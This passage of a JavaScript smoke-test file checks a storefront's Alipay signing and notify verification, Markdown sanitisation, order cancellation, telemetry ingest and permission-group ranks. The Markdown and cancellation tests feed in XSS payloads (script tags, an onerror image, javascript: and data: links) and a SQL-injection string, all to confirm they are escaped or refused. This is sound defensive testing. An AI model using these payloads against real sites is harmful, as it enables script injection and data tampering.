assert(alipayParams.return_url === `${site}/order?order_id=${order.id}&paid=1`, 'the buyer must land back on the order page')
const alipayBiz = JSON.parse(alipayParams.biz_content)
assert(alipayBiz.out_trade_no === alipayOutTradeNo(order.id) && alipayBiz.total_amount === '19.99', 'biz_content carries the order reference and the yuan amount')
assert(alipayBiz.product_code === 'FAST_INSTANT_TRADE_PAY', 'product_code is what selects 电脑网站支付; the wrong one is refused by the gateway')
assert(alipayBiz.subject === '入门版', 'the buyer must see the artifact name on the cashier page, not the SKU')
assert(alipayBiz.timeout_express === '30m' && alipayBiz.quit_url === undefined, 'an unpaid order must close itself, and page.pay has no quit_url')
const alipayWapBiz = JSON.parse(alipayRequestParams({ order: cnyOrder, artifact, siteUrl: site, config: { product: 'wap' } }).biz_content)
assert(alipayWapBiz.product_code === 'QUICK_WAP_WAY' && alipayWapBiz.quit_url === `${site}/order?order_id=${order.id}`,
  'wap.pay needs a quit_url, or tapping 返回 inside Alipay lands the buyer on a blank page')

// page.pay 是一条签好名的 GET 跳转，不是服务端 POST——所以下单这一步不依赖网关可用。
const alipayUrl = alipayCheckoutUrl(alipayParams, process.env.ALIPAY_PRIVATE_KEY)
const alipayQuery = new URL(alipayUrl).searchParams
assert(alipayUrl.startsWith(`${ALIPAY_GATEWAY}?`), 'the checkout URL is the gateway itself with the signed parameters attached')
assert(alipayQuery.get('biz_content') === alipayParams.biz_content, 'biz_content must survive the URL encoding byte for byte')
assert(alipayQuery.get('sign') === alipaySign(alipayParams, process.env.ALIPAY_PRIVATE_KEY), 'the URL must carry exactly the signature computed over the sorted parameters')
assert(
  nodeCrypto.createVerify('RSA-SHA256').update(alipaySignContent(alipayParams), 'utf8').verify(process.env.ALIPAY_PUBLIC_KEY, alipayQuery.get('sign'), 'base64'),
  'the request signature must verify over the content that includes sign_type'
)

// 通知按 V1 规则签（剔除 sign 和 sign_type），这是支付宝异步通知真正用的那一条。
const alipayNotifySign = (data) =>
  nodeCrypto.createSign('RSA-SHA256').update(alipaySignContent(data, ['sign', 'sign_type']), 'utf8').sign(process.env.ALIPAY_PRIVATE_KEY, 'base64')
const notify = {
  notify_time: '2026-08-30 09:05:00', notify_type: 'trade_status_sync', notify_id: 'n_smoke_1',
  app_id: '2021000000000001', auth_app_id: '2021000000000001', charset: 'utf-8', version: '1.0', sign_type: 'RSA2',
  trade_no: '2026083022001400000000000001', out_trade_no: alipayOutTradeNo(order.id),
  trade_status: 'TRADE_SUCCESS', total_amount: '19.99', receipt_amount: '19.99', buyer_id: '2088000000000001'
}
const signedNotify = (data) => ({ ...data, sign: alipayNotifySign(data) })

const alipayPaid = await DRIVERS.alipay.verify({ payload: signedNotify(notify), headers: {}, config: {} })
assert(alipayPaid.paid === true && alipayPaid.orderId === order.id, 'a signed TRADE_SUCCESS releases the order, and out_trade_no maps back to the UUID')
assert(alipayPaid.ack.ok === 'success' && alipayPaid.ack.fail === 'failure',
  'Alipay reads anything but the literal success as a failed notify and redelivers it 8 times over 24h')
assert(alipayPaid.expect.amountMinor === 1999 && alipayPaid.expect.currency === 'CNY', 'total_amount is compared against the order row, so an underpayment cannot release it')
assert(alipayPaid.providerOrderId === notify.trade_no, "the row must end up holding Alipay's own trade number, which is what the console searches on")

// 换算过的订单走完整一圈：下单时锁进单号的那一对金额，让一笔人民币付款能跟一行美元订单对上。这一段钉住的
// 是 payment-callback 里那条 `expect.amountMinor < row.amount_minor` 比较——足额必须恰好相等（差一分就是
// 409，一笔真付款被拒），少付必须严格小于（否则一笔少付的订单被放货）。
const fxNotify = { ...notify, out_trade_no: fxRef, total_amount: '142.94', receipt_amount: '142.94' }
const fxPaid = await DRIVERS.alipay.verify({ payload: signedNotify(fxNotify), config: {} })
assert(fxPaid.paid === true && fxPaid.orderId === order.id, 'the suffix must not stop the converted order from being found')
assert(fxPaid.expect.currency === 'USD' && fxPaid.expect.amountMinor === 1999,
  'the CNY the buyer actually paid folds back to the order currency at the rate locked at checkout, not at the rate on the day the notify arrives')
const fxShort = await DRIVERS.alipay.verify({ payload: signedNotify({ ...fxNotify, total_amount: '142.93', receipt_amount: '142.93' }), config: {} })
assert(fxShort.expect.currency === 'USD' && fxShort.expect.amountMinor < 1999, 'one fen short of the converted price must still be refused')
assert(fxPaid.providerOrderId === notify.trade_no
  && (await DRIVERS.alipay.verify({ payload: signedNotify({ ...fxNotify, trade_no: '' }), config: {} })).providerOrderId === fxRef,
  'with no trade_no yet the row keeps the merchant reference verbatim — a rebuilt 32-hex one exists nowhere in the console')

assert((await DRIVERS.alipay.verify({ payload: signedNotify({ ...notify, trade_status: 'TRADE_FINISHED' }), config: {} })).paid === true,
  'TRADE_FINISHED means the money arrived and can no longer be refunded — not that it failed')
const alipayWaiting = await DRIVERS.alipay.verify({ payload: signedNotify({ ...notify, trade_status: 'WAIT_BUYER_PAY' }), config: {} })
assert(alipayWaiting.paid === false && alipayWaiting.failed === false, 'a buyer who opened the cashier but has not paid must stay pending')
assert((await DRIVERS.alipay.verify({ payload: signedNotify({ ...notify, trade_status: 'TRADE_CLOSED' }), config: {} })).failed === true,
  'a closed trade must be marked failed rather than left pending forever')

const alipayTampered = await DRIVERS.alipay.verify({ payload: { ...signedNotify(notify), total_amount: '0.01' }, config: {} })
assert(alipayTampered.reject?.status === 401 && alipayTampered.ack.fail === 'failure', 'editing a signed field must fail verification, not lower the price')
assert((await DRIVERS.alipay.verify({ payload: notify, config: {} })).reject?.status === 401, 'a notify carrying no signature at all must be refused')
const alipayForeign = { ...notify, app_id: '2021000000000002', auth_app_id: '2021000000000002' }
assert((await DRIVERS.alipay.verify({ payload: signedNotify(alipayForeign), config: {} })).reject?.status === 401,
  "a correctly signed notify for another merchant's app must be refused — the signature proves who signed it, not who it was signed for")
// 两条规则都收是有意的：异步通知用 V1，同步跳转用 V2，正文分不出来，而两者都必须是支付宝私钥签的。
assert((await DRIVERS.alipay.verify({ payload: { ...notify, sign: alipaySign(notify, process.env.ALIPAY_PRIVATE_KEY) }, config: {} })).paid === true,
  'a notify signed under the sync-return rule must still verify; both rules require Alipay to have signed it')
const { trade_status: _dropped, ...alipayRefundNotify } = notify
const alipayIgnored = await DRIVERS.alipay.verify({ payload: signedNotify({ ...alipayRefundNotify, notify_type: 'batch_refund_notify' }), config: {} })
assert(alipayIgnored.ignore === true && alipayIgnored.ack.ok === 'success',
  'a notify with no trade_status touches no order but must still be acknowledged, or Alipay redelivers it for a full day')

assert(driverFor({ driver: 'stripe' }) === DRIVERS.stripe && driverFor({ driver: 'PayPal' }) === DRIVERS.paypal, 'the driver name in public_config must resolve case-insensitively')
assert(driverFor({ driver: 'Alipay' }) === DRIVERS.alipay, 'alipay resolves through the driver table now that it signs its own requests; on the generic path it could only ever get Invalid signature')
assert(driverFor({}) === null && driverFor(null) === null && driverFor({ driver: 'wechat' }) === null, 'the remaining seven providers must keep using the generic create_url path')
for (const [name, driver] of Object.entries(DRIVERS)) {
  assert(typeof driver.create === 'function' && typeof driver.verify === 'function', `${name} driver must be able to create a checkout and verify a callback`)
}

console.log('Payment drivers: OK')

// CMS Markdown. These strings go through v-html, so the escaping and the link policy are the two
// things that must not regress; the newline behaviour is the bug users actually reported.

// First, the fallback that is on screen before the renderer chunk arrives — and for the whole page
// load if it never does. It has to be exactly as safe as the real thing, and it has to keep line
// breaks, or the reported bug comes back during the gap.
assert(renderMarkdown('第一行\n第二行') === '第一行<br>\n第二行', 'the fallback keeps line breaks')
assert(renderMarkdown('<script>alert(1)</script>') === '&lt;script&gt;alert(1)&lt;/script&gt;',
  'the fallback escapes HTML — it must not be a hole that opens for a few milliseconds on every load')
assert(renderMarkdownInline('**粗**') === '**粗**', 'the fallback leaves syntax literal rather than dropping text')
assert(renderMarkdown('') === '' && renderMarkdown(null) === '', 'the fallback renders nothing for empty input')

// A single call, awaited once: every assertion below runs against the real renderer.
await preloadMarkdown()

assert(renderMarkdown('第一行\n第二行') === '<p>第一行<br>\n第二行</p>\n',
  'a single newline must become <br> — an author typing two lines in a textarea means two lines')
assert(renderMarkdown('上\n\n下') === '<p>上</p>\n<p>下</p>\n', 'a blank line still separates paragraphs')
assert(renderMarkdown('**粗** 和 `代码`').includes('<strong>粗</strong>')
  && renderMarkdown('**粗** 和 `代码`').includes('<code>代码</code>'), 'basic emphasis and code spans must render')
assert(renderMarkdown('## 小标题').trim() === '<h2>小标题</h2>', 'the syntax /admin advertises for posts.body must work')
assert(renderMarkdown('- 甲\n- 乙').includes('<li>甲</li>'), 'list items must render as a real list')

// html:false — a description is not a place to inject markup.
assert(renderMarkdown('<script>alert(1)</script>').includes('&lt;script&gt;')
  && !renderMarkdown('<script>alert(1)</script>').includes('<script>'), 'raw HTML must be escaped, not executed')
assert(renderMarkdown('<img src=x onerror=alert(1)>').includes('&lt;img'), 'an inline HTML tag must be escaped too')

// validateLink allowlist: only web, mail and same-origin targets survive.
assert(renderMarkdown('[x](https://example.com)').includes('href="https://example.com"'), 'https links must be kept')
assert(renderMarkdown('[x](/buy)').includes('href="/buy"'), 'site-relative links must be kept')
assert(renderMarkdown('[x](mailto:a@b.c)').includes('href="mailto:a@b.c"'), 'mailto links must be kept')
assert(!renderMarkdown('[x](javascript:alert(1))').includes('href='), 'a javascript: URL must not survive as a link')
assert(!renderMarkdown('[x](data:text/html;base64,PHN2Zz4=)').includes('href='), 'a data: URL must not survive as a link')
const external = renderMarkdown('[x](https://example.com)')
assert(external.includes('target="_blank"') && external.includes('rel="noopener noreferrer"'),
  'off-site links open in a new tab and must not hand over window.opener')
assert(!renderMarkdown('[x](/buy)').includes('target='), 'a same-site link must stay in the current tab')

// Inline renderer: the fixed-height cards on / and /buy must not be handed block elements.
assert(renderMarkdownInline('**粗**') === '<strong>粗</strong>', 'inline rendering must not wrap text in <p>')
assert(!renderMarkdownInline('## 标题').includes('<h2'), 'a heading must stay literal inside a fixed-height card')
assert(renderMarkdownInline('<script>x</script>').includes('&lt;script&gt;'), 'the inline renderer escapes HTML as well')

assert(renderMarkdown('') === '' && renderMarkdown(null) === '' && renderMarkdown(undefined) === ''
  && renderMarkdownInline(null) === '', 'an empty or absent description must render nothing, not "null"')

console.log('CMS Markdown: OK')

// Order cancellation. This route runs on the service client, which bypasses RLS — so the filters on
// the update are the entire authorization check. Losing one would let any buyer cancel anyone's order,
// or cancel an order that has already been paid. A recording fake asserts they are all still there.
const fakeDb = (updateResult, selectResult) => {
  const calls = { update: null, updateFilters: {}, selectFilters: {}, selected: null }
  const chain = (bucket, result) => {
    const link = {
      eq(column, value) { bucket[column] = value; return link },
      select(columns) { calls.selected = columns ?? '*'; return link },
      maybeSingle: async () => result
    }
    return link
  }
  return {
    calls,
    from(table) {
      assert(table === 'orders', 'cancellation must only ever touch the orders table')
      return {
        update(patch) { calls.update = patch; return chain(calls.updateFilters, updateResult) },
        select(columns) { calls.selected = columns; return chain(calls.selectFilters, selectResult) }
      }
    }
  }
}
const OWNER = '11111111-1111-4111-8111-111111111111'
const ORDER = '22222222-2222-4222-8222-222222222222'

let db = fakeDb({ data: { id: ORDER, status: 'cancelled' } }, { data: null })
let result = await cancelPendingOrder(db, OWNER, ORDER)
assert(result.status === 200 && result.body.order.status === 'cancelled', 'cancelling a pending order succeeds')
assert(db.calls.updateFilters.id === ORDER, 'the update must target the requested order')
assert(db.calls.updateFilters.user_id === OWNER, 'the update must be scoped to the caller — this is the ownership check')
assert(db.calls.updateFilters.status === 'pending', 'the update must require the order to still be pending')
assert(db.calls.update.status === 'cancelled' && db.calls.update.checkout_url === null,
  'cancelling clears checkout_url so a stale hosted payment page is no longer offered')
assert(Object.keys(db.calls.update).length === 2, 'nothing but status and checkout_url may be written')

// Nothing updated because the row belongs to someone else, or does not exist.
db = fakeDb({ data: null }, { data: null })
result = await cancelPendingOrder(db, OWNER, ORDER)
assert(result.status === 404, 'an order that is not the caller\'s answers 404')
assert(db.calls.selectFilters.user_id === OWNER,
  'the follow-up lookup stays scoped to the caller — probing must not distinguish a real order from a missing one')

// Nothing updated because the status moved on. Cancelling a paid order would strand the buyer's money.
for (const status of ['paid', 'cancelled', 'refunded', 'failed', 'refund_pending']) {
  const guard = fakeDb({ data: null }, { data: { id: ORDER, status } })
  const answer = await cancelPendingOrder(guard, OWNER, ORDER)
  assert(answer.status === 409 && answer.body.error.includes(status), `a ${status} order cannot be cancelled`)
}

for (const bad of ['', null, undefined, 'not-a-uuid', '22222222-2222-4222-8222', "' or 1=1--"]) {
  const answer = await cancelPendingOrder(fakeDb({ data: null }, { data: null }), OWNER, bad)
  assert(answer.status === 400, `a malformed order_id (${JSON.stringify(bad)}) answers 400, not 500`)
}

let cancelStatus = 0
let cancelBody = null
const cancelResponse = { status(code) { cancelStatus = code }, setHeader() {}, send(value) { cancelBody = JSON.parse(value) } }
await cancelHandler({ method: 'GET', headers: {} }, cancelResponse)
assert(cancelStatus === 405, 'cancellation must be POST-only')
await cancelHandler({ method: 'POST', headers: {} }, cancelResponse)
assert(cancelStatus === 401 && cancelBody?.error, 'cancellation must reject an unauthenticated request')

console.log('Order cancellation: OK')

// --- Telemetry samples ---------------------------------------------------------------------------
// The wire format is the contract between the plugin and the database, and both halves are far away
// from these tests, so what is checked here is that a sample is either accepted whole or rejected
// whole, that counters accumulate across restarts, and that the endpoint's guards run before any
// database work — a sample that got half-stored would be counted in 装机量 while describing nothing.
const HW = 'a'.repeat(64)
const goodSample = { hwid: HW, mcver: '1.21.4', loader: 'paper', modver: '2.6.0', licensestatus: 'active' }

assert(parseSample(goodSample).sample?.hwid === HW, 'a minimal valid sample is accepted')
assert(parseSample({ ...goodSample, hwid: HW.toUpperCase() }).sample?.hwid === HW, 'hwid is normalised to lower case')
assert(parseSample({ ...goodSample, licensestatus: 'ACTIVE' }).sample?.licensestatus === 'active', 'licensestatus is case-insensitive')

for (const bad of [null, undefined, 'string', 42, []]) {
  assert(parseSample(bad).error, `a ${JSON.stringify(bad)} body is rejected`)
}
for (const bad of ['', 'short', HW.slice(1), HW + 'a', 'z'.repeat(64), `${HW.slice(0, 63)}!`]) {
  assert(parseSample({ ...goodSample, hwid: bad }).error, `hwid ${JSON.stringify(bad)} is rejected`)
}
for (const key of ['mcver', 'loader', 'modver']) {
  assert(parseSample({ ...goodSample, [key]: '' }).error, `${key} cannot be empty`)
  assert(parseSample({ ...goodSample, [key]: '   ' }).error, `${key} cannot be whitespace`)
  assert(parseSample({ ...goodSample, [key]: undefined }).error, `${key} cannot be absent`)
  assert(parseSample({ ...goodSample, [key]: 'x'.repeat(300) }).error, `an oversized ${key} is rejected`)
}
assert(parseSample({ ...goodSample, licensestatus: 'lapsed' }).error, 'an unknown licensestatus is rejected')
assert(parseSample({ ...goodSample, licensestatus: '' }).error, 'a missing licensestatus is rejected')
// unknown must stay separate from invalid: conflating them would make a network outage to the licence
// server read as a customer's licence being revoked.
assert(LICENSE_STATUS.includes('unknown') && LICENSE_STATUS.includes('invalid'), 'unknown and invalid are distinct statuses')

// Optional fields: absent and empty both mean "this install did not say", and only a present-and-wrong
// value is an error.
const bare = parseSample(goodSample).sample
assert(bare.os === '' && bare.osver === '' && bare.osarch === '', 'absent optional descriptors store as empty')
assert(bare.licensecode === null, 'an unreported licencecode stores as null, not empty string')
assert(parseSample({ ...goodSample, licensecode: '' }).sample.licensecode === null, 'a blank licencecode stores as null')
assert(parseSample({ ...goodSample, licensecode: 'AAA-BBB' }).sample.licensecode === 'AAA-BBB', 'a reported licencecode is kept')
assert(parseSample({ ...goodSample, licensecode: 42 }).error, 'a non-string licencecode is rejected')
assert(parseSample({ ...goodSample, licensecode: 'x'.repeat(200) }).error, 'an oversized licencecode is rejected')
assert(parseSample({ ...goodSample, osarch: 'x'.repeat(40) }).error, 'an oversized osarch is rejected')
assert(parseSample({ ...goodSample, retry_license_after: 'soon' }).error, 'a non-timestamp retry_license_after is rejected')
assert(
  parseSample({ ...goodSample, retry_license_after: '2026-09-01T00:00:00Z' }).sample.retry_license_after === '2026-09-01T00:00:00.000Z',
  'retry_license_after is normalised to ISO 8601'
)
assert(parseSample({ ...goodSample, retry_license_after: '' }).sample.retry_license_after === null, 'a blank retry_license_after stores as null')

// Counters arrive as deltas, so they must be non-negative integers and bounded — an install cannot
// have crashed a billion times since its last heartbeat, and a figure that large is a bug or an attack.
for (const key of ['errors', 'crashes', 'warns']) {
  assert(parseSample(goodSample).sample[key] === 0, `${key} defaults to 0`)
  assert(parseSample({ ...goodSample, [key]: 3 }).sample[key] === 3, `${key} is carried through`)
  assert(parseSample({ ...goodSample, [key]: -1 }).error, `a negative ${key} is rejected`)
  assert(parseSample({ ...goodSample, [key]: 1.5 }).error, `a fractional ${key} is rejected`)
  assert(parseSample({ ...goodSample, [key]: '3' }).error, `a string ${key} is rejected`)
  assert(parseSample({ ...goodSample, [key]: 9e9 }).error, `an absurd ${key} is rejected`)
}

// mergeSample: descriptors overwrite, counters add. A client that restarts has forgotten its own
// tallies, which is exactly why the total is kept server-side.
const first = mergeSample(null, parseSample({ ...goodSample, errors: 2 }).sample, new Date('2026-08-01T00:00:00Z'))
assert(first.samples === 1 && first.errors === 2, 'a first sample starts the tallies')
assert(first.first_seen === '2026-08-01T00:00:00.000Z' && first.last_seen === first.first_seen, 'a first sample sets both timestamps')
const second = mergeSample(first, parseSample({ ...goodSample, modver: '2.7.0', errors: 3, crashes: 1 }).sample, new Date('2026-08-02T00:00:00Z'))
assert(second.errors === 5 && second.crashes === 1, 'counters accumulate across samples')
assert(second.modver === '2.7.0', 'a descriptor is overwritten by the newest sample')
assert(second.first_seen === first.first_seen, 'first_seen never moves')
assert(second.last_seen === '2026-08-02T00:00:00.000Z', 'last_seen follows the newest sample')
assert(second.samples === 2, 'the sample count increments')
// A restarted client reports 0 rather than replaying its history; the total must not drop.
const third = mergeSample(second, parseSample(goodSample).sample, new Date('2026-08-03T00:00:00Z'))
assert(third.errors === 5 && third.crashes === 1, 'a restarted client reporting zero deltas does not reset the totals')

// summarise: 装机量 is every install, 运行量 only those inside the window, and the breakdowns describe
// what is running now — a version retired a year ago must not sit in the list forever.
const NOW = Date.parse('2026-08-29T12:00:00Z')
const ago = (ms) => new Date(NOW - ms).toISOString()
const fleet = [
  { last_seen: ago(60_000), mcver: '1.21.4', loader: 'paper', licensestatus: 'active', osarch: 'amd64', errors: 4, crashes: 1, warns: 7 },
  { last_seen: ago(120_000), mcver: '1.21.4', loader: 'paper', licensestatus: 'active', osarch: 'aarch64', errors: 0, crashes: 0, warns: 0 },
  { last_seen: ago(90_000), mcver: '1.20.6', loader: 'fabric', licensestatus: 'expired', osarch: 'amd64', errors: 2, crashes: 0, warns: 1 },
  { last_seen: ago(30 * 24 * 3600_000), mcver: '1.19.2', loader: 'spigot', licensestatus: 'expired', osarch: 'amd64', errors: 9, crashes: 3, warns: 2 }
]
const summary = summarise(fleet, NOW)
assert(summary.installed_hwid === 4, '装机量 counts every install ever seen')
assert(summary.running_hwid === 3, '运行量 counts only installs inside the running window')
assert(summary.errors === 15 && summary.crashes === 4 && summary.warns === 10, 'counters total across the whole fleet, including long-silent installs')
assert(!('1.19.2' in summary.by_mcver), 'a breakdown excludes installs outside the running window')
assert(summary.by_mcver['1.21.4'] === 2 && summary.by_mcver['1.20.6'] === 1, 'installs are tallied by version')
assert(Object.keys(summary.by_mcver)[0] === '1.21.4', 'a breakdown is ordered largest first')
assert(summary.by_loader.paper === 2 && summary.by_licensestatus.active === 2 && summary.by_osarch.amd64 === 2, 'every required breakdown is produced')
assert(summarise([], NOW).installed_hwid === 0 && Object.keys(summarise([], NOW).by_mcver).length === 0, 'an empty fleet summarises to zeroes, not a crash')
assert(summarise(null, NOW).installed_hwid === 0, 'a missing fleet is treated as empty')
assert(summarise([{ last_seen: ago(1000), errors: 0 }], NOW).by_osarch['未知'] === 1, 'an install that reported no osarch is labelled rather than dropped')
// The window is deliberately several times the heartbeat interval: at exactly one interval a sample a
// second late would drop a live server out of the count and make the figure flicker.
assert(RUNNING_WINDOW_MS >= 3 * 5 * 60 * 1000, 'the running window is several heartbeat intervals wide')

// Endpoint guards. Every one of these answers before the service client is constructed, so they hold
// with no Supabase credentials in the environment.
let tStatus = 0
let tBody = null
const tRes = { status(code) { tStatus = code }, setHeader() {}, send(value) { tBody = JSON.parse(value) } }
const savedKey = process.env.TELEMETRY_INGEST_KEY

delete process.env.TELEMETRY_INGEST_KEY
await telemetryHandler({ method: 'GET', headers: {} }, tRes)
assert(tStatus === 405, 'telemetry ingest is POST-only')
await telemetryHandler({ method: 'POST', headers: {}, body: goodSample }, tRes)
assert(tStatus === 503, 'an unconfigured endpoint refuses rather than accepting anonymously')

process.env.TELEMETRY_INGEST_KEY = 'test-ingest-key'
await telemetryHandler({ method: 'POST', headers: {}, body: goodSample }, tRes)
assert(tStatus === 401, 'a sample with no key is rejected')
await telemetryHandler({ method: 'POST', headers: { 'x-aether-key': 'wrong' }, body: goodSample }, tRes)
assert(tStatus === 401, 'a sample with the wrong key is rejected')
// The comparison hashes both sides before comparing, so a key that is merely a prefix of the real one
// must not pass — that is the failure mode a length-dependent compare would have.
await telemetryHandler({ method: 'POST', headers: { 'x-aether-key': 'test-ingest' }, body: goodSample }, tRes)
assert(tStatus === 401, 'a key that is a prefix of the real one is rejected')
await telemetryHandler({ method: 'POST', headers: { 'x-aether-key': 'test-ingest-key' }, body: { hwid: 'nope' } }, tRes)
assert(tStatus === 400 && tBody?.error, 'a malformed sample answers 400 before touching the database')
await telemetryHandler({ method: 'POST', headers: { authorization: 'Bearer test-ingest-key' }, body: { hwid: 'nope' } }, tRes)
assert(tStatus === 400, 'the key is also accepted as a bearer token')

if (savedKey === undefined) delete process.env.TELEMETRY_INGEST_KEY
else process.env.TELEMETRY_INGEST_KEY = savedKey

console.log('Telemetry samples: OK')

// --- §6 权限组与 GitHub 团队映射 ------------------------------------------------------------------
// rank 表有两份：shared/groups.mjs（浏览器和接口共用）和 schema.sql 里的 private.group_rank()（管 RLS，
// 没法从 JS 引用）。两边不一致的后果是「界面显示能做但接口拒绝」，或者反过来——后者是个安全洞。
// 所以这里把 JS 那份和那段 SQL 对着断言，而不是各自单测。
const GROUPS = GROUP_ORDER
const schemaSql = readFileSync(new URL('../supabase/schema.sql', import.meta.url), 'utf8')

for (const group of GROUPS) {
  assert(GROUP_RANK[group] !== undefined, `${group} needs a rank in shared/groups.mjs`)
  assert(API_RANK[group] === GROUP_RANK[group], `${group} must reach the API with the same rank the UI shows`)
  assert(GROUP_LABEL[group], `${group} needs a Chinese label, or the admin select shows a bare slug`)
  // schema.sql 的 group_rank() 用 g::text 比较，所以每个组名都该以字符串出现在那个 case 里。
  assert(new RegExp(`when '${group}' then ${GROUP_RANK[group]}`).test(schemaSql) || group === 'default',
    `private.group_rank() must rank '${group}' as ${GROUP_RANK[group]} to match shared/groups.mjs`)
}
assert(new Set(GROUP_ORDER).size === GROUP_ORDER.length, 'GROUP_ORDER must list every group exactly once')
assert(Object.keys(GROUP_RANK).length === GROUP_ORDER.length, 'every ranked group must be assignable from the admin select')
// 未知组必须是 0，不是 undefined：一个将来加进枚举但忘了排名的组要无权，而不是意外获得权限。
assert(rankOf('nonexistent') === 0 && rankOf(null) === 0 && rankOf(undefined) === 0,
  'an unranked group must read as 0, never as undefined — undefined >= 777 is false but undefined < 111 is also false')
assert(/else 0 end/.test(schemaSql), 'private.group_rank() must fall through to 0 for the same reason')

// §6 的优先级：admin 999 > cs 888 > postsale = presale 777 > coworker 555 > read 111 > default 0
assert(GROUP_RANK.admin > GROUP_RANK.cs && GROUP_RANK.cs > GROUP_RANK.postsale, '§6 ranks admin above cs above the single-team agents')
assert(GROUP_RANK.presale === GROUP_RANK.postsale, 'presale and postsale share §6 priority 777')
assert(GROUP_RANK.default === 0, 'an ordinary buyer must rank 0')
assert(RANK.ADMIN === GROUP_RANK.admin && RANK.STAFF === GROUP_RANK.presale && RANK.MEMBER === GROUP_RANK.read,
  'the named thresholds must line up with the ranks they are meant to name')

// 编辑权限不是 rank 阈值。售前客服在 §6 里高于文案（777 > 555），但不该因此能发文章——这条如果退化成
// rank >= 555，客服就能改站点内容，而 §2 从没给过这个权限。
assert(isEditor('coworker') && isEditor('admin'), '文案 and 管理员 are the two groups that may publish')
for (const group of ['presale', 'postsale', 'cs']) {
  assert(!isEditor(group), `${group} outranks 文案 in ticket dispatch but must not be able to publish content`)
  assert(GROUP_RANK[group] > GROUP_RANK.coworker, `${group} does outrank 文案 — which is exactly why editing cannot be a rank threshold`)
}
assert(!isEditor('read') && !isEditor('default'), 'neither read nor default may publish')
assert(EDITOR_GROUPS.length === 2, 'the editor list is an enumeration, not a threshold')
assert(/private\.is_editor\(\)/.test(schemaSql), 'schema.sql must gate posts/progress on is_editor(), not on a rank')
assert(!/my_rank\(\)\) >= 555/.test(schemaSql), 'no policy may use 555 as an editing threshold')

// §12.2：read 及以上能看全部订单，已确认是有意的。
assert(rankOf('read') >= RANK.MEMBER, 'read must clear the order-visibility floor')
assert(rankOf('default') < RANK.MEMBER, 'an ordinary buyer must not clear it, or every buyer sees every order')
assert(/create policy own_orders_read[\s\S]{0,200}can_view_orders\(\)/.test(schemaSql),
  'the orders read policy must go through can_view_orders(), which is where §12.2 is decided')

// 枚举事务陷阱：alter type ... add value 之后，同一事务里不能把新值当字面量用，而 schema.sql 是整段跑的。
// 所以三个新组名不能出现在任何 = 'xxx' 或 in ('xxx') 的比较里——只能经过 g::text。
assert(/add value if not exists 'presale'/.test(schemaSql), 'the three new groups must be added with ALTER for pre-existing databases')
for (const group of ['presale', 'postsale', 'cs']) {
  const asEnumLiteral = new RegExp(`current_user_group\\(\\)\\)?\\s*(=|in\\s*\\()\\s*[^)]*'${group}'`)
  assert(!asEnumLiteral.test(schemaSql),
    `'${group}' must not be compared as an enum literal — same transaction as its ALTER, so Postgres refuses with "unsafe use of new value"`)
}
// github_team_map 是这个文件自己 seed 的，所以它的 group_name 必须是 text：写 'cs' 作为枚举字面量会在
// 刚 ALTER 过这个类型的库上失败。user_profiles.group_name 用枚举没问题——它不在这个文件里被 seed。
const teamMapDdl = schemaSql.slice(schemaSql.indexOf('create table if not exists public.github_team_map'))
assert(/group_name text not null check/.test(teamMapDdl.slice(0, 400)),
  'github_team_map.group_name must be a text column with a check constraint, not the enum, for the transaction reason')
// 旧的 ='admin' 比较同样是被 ALTER 过的类型的字面量，必须全部换成 helper。
assert(!/current_user_group\(\)\)\s*=\s*'admin'/.test(schemaSql), "no policy may still compare current_user_group() = 'admin'")

// resolveGroup：§6 里「同时在售前和售后团队」→ cs，这不是取最高能算出来的（两个都是 777）。
assert(resolveGroup(['presale', 'postsale']) === 'cs', 'membership of both CS teams maps to cs, per §6')
assert(resolveGroup(['postsale', 'presale']) === 'cs', 'the order the teams come back in must not matter')
assert(resolveGroup(['presale']) === 'presale' && resolveGroup(['postsale']) === 'postsale', 'a single CS team maps to itself')
// cs 是 777 档内部的升级，不是一条盖过 admin 的规则：既在 devs 又在两个客服团队里的人是 admin，不是 cs。
assert(resolveGroup(['admin', 'presale', 'postsale']) === 'admin', 'devs/testers outrank the cs promotion')
assert(resolveGroup(['cs', 'presale']) === 'cs', 'an explicit cs team membership stands on its own')
assert(resolveGroup(['coworker', 'presale']) === 'presale', 'the highest §6 priority wins when the cs rule does not apply')
assert(resolveGroup(['coworker']) === 'coworker' && resolveGroup(['admin']) === 'admin', 'a lone team maps to its own group')
assert(resolveGroup([]) === null, 'no team match must be distinguishable from a match, so the caller can fall back to read')
assert(resolveGroup(['presale', 'presale']) === 'presale', 'a duplicated team must not change the outcome')

// §6 的团队 slug 全部登记在表里，而不是硬编码在端点里——slug 是唯一无法从代码验证的部分。
for (const [slug, group] of [['devs', 'admin'], ['testers', 'admin'], ['pre-sales', 'presale'], ['post-sales', 'postsale'], ['copywriter', 'coworker']]) {
  assert(new RegExp(`\\('${slug}','${group}'`).test(schemaSql), `§6 maps @AetherAC/${slug} to ${group}; github_team_map must seed it`)
}
assert(/github_team_map/.test(schemaSql), 'the team map must be a table so a wrong slug can be fixed without a deploy')

assert(loginOf({ user_metadata: { user_name: 'octocat' } }) === 'octocat', 'GitHub OAuth stores the login in user_name')
assert(loginOf({ user_metadata: { preferred_username: 'octocat' } }) === 'octocat', 'the OIDC spelling must also be read')
assert(loginOf({ user_metadata: {} }) === null && loginOf({}) === null && loginOf(null) === null,
  'an account with no GitHub identity must report null rather than "undefined" as a login')

let syncStatus = 0
let syncBody = null
const syncRes = { status(code) { syncStatus = code }, setHeader() {}, send(value) { syncBody = JSON.parse(value) } }
const savedOrgToken = process.env.GITHUB_ORG_TOKEN

// 没配 token：必须 200 + configured:false。前端登录后会无条件打这个接口，回 5xx 会在每个买家的控制台刷红。
delete process.env.GITHUB_ORG_TOKEN
await syncHandler({ method: 'GET', headers: {} }, syncRes)
assert(syncStatus === 200 && syncBody?.configured === false, 'an unconfigured sync endpoint must answer 200, not an error')
assert(/GITHUB_ORG_TOKEN/.test(syncBody.message) && /read:org/.test(syncBody.message), 'the fallback must name the variable and the scope it needs')

// 配了 token 但没登录：401。这一步在构造 Supabase 客户端之前答完，所以不需要数据库凭证。
process.env.GITHUB_ORG_TOKEN = 'ghp_smoke_not_a_real_token'
await syncHandler({ method: 'GET', headers: {} }, syncRes)
assert(syncStatus === 401 && syncBody?.error, 'a configured sync endpoint must still require a session')
await syncHandler({ method: 'POST', headers: {} }, syncRes)
assert(syncStatus === 401, 'the admin POST path must reject an unauthenticated request before reading the body')
await syncHandler({ method: 'DELETE', headers: {} }, syncRes)
assert(syncStatus === 405, 'only GET and POST are defined')

if (savedOrgToken === undefined) delete process.env.GITHUB_ORG_TOKEN
else process.env.GITHUB_ORG_TOKEN = savedOrgToken

